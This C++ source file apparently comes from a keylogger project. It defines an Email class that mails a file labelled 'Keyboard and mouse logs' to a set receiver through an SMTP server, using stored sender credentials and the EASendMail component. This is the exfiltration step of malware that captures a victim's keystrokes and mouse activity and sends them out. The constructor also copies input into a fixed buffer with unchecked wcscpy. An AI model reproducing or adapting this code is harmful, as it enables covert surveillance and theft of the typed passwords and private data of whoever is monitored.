#include "Email.h"

Email::Email(string receiver)
{
	wstring receiverWide(receiver.begin(), receiver.end());
	wcscpy(this->receiver, receiverWide.c_str());
}


Email::~Email()
{
}

void Email::send(wstring fileName)
{
	::CoInitialize(NULL);
	IMailPtr oSmtp = NULL;
	oSmtp.CreateInstance("EASendMailObj.Mail");
	oSmtp->FromAddr = EMAIL_FROM_NAME;
	oSmtp->LicenseCode = L"TryIt";
	oSmtp->AddRecipientEx(receiver, 0);
	oSmtp->Subject = L"Keyboard and mouse logs";
	oSmtp->BodyText = L"This is auto message, don't reply.";
	oSmtp->ServerAddr = EMAIL_SMTP_ADDRESS;
	oSmtp->UserName = EMAIL_FROM_NAME;
	oSmtp->Password = EMAIL_FROM_PASSWORD;
	oSmtp->SSL_init();
	oSmtp->AddAttachment(fileName.c_str());
	oSmtp->SendMail();
	if (oSmtp != NULL)
		oSmtp.Release();
	return;
}